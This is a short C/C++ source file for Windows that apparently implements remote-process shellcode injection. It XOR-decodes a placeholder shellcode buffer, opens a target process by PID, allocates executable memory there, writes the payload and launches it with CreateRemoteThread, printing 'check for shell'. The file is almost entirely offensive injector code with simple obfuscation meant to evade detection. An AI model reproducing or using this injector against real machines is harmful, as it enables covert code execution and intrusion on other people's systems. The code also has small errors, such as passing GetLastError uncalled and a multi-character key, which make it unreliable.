#include <windows.h>
#include <stdio.h>


int Error(const char* msg) {
	printf("%s (%u)\n", msg, GetLastError);
	return 1;
}

int main(int argc, char *argv[]) {

	int pid = atoi(argv[1]);

	HANDLE hProcess, hRemoteThread = nullptr;
	void* pBuffer = nullptr;

	unsigned char code[] = "xor'ed shellcode";

	char key = 'key';
	int i = 0;
	for (i; i < sizeof(code) - 1; i++)
	{
		code[i] = code[i] ^ key;
	}

	printf("[*]Opening handle to process\n");
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
	if (!hProcess)
		return Error("Failed in opening handle to process");

	printf("[*]Allocating memory inside target process\n");
	pBuffer = VirtualAllocEx(hProcess, nullptr, sizeof(code), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!pBuffer)
		return Error("Failed in VirtualAllocEx");

	printf("[*]Writing shellcode inside target process\n");
	if (!WriteProcessMemory(hProcess, pBuffer, code, sizeof(code), nullptr)) {
		return Error("Failed in WriteProcessMemory");
	}

	printf("[*]Executing shellcode, check for shell\n");
	hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pBuffer, NULL, 0, NULL);
	if (!hRemoteThread)
		return Error("Failed to create thread");

	CloseHandle(hRemoteThread);
	CloseHandle(hProcess);

	return 0;
}
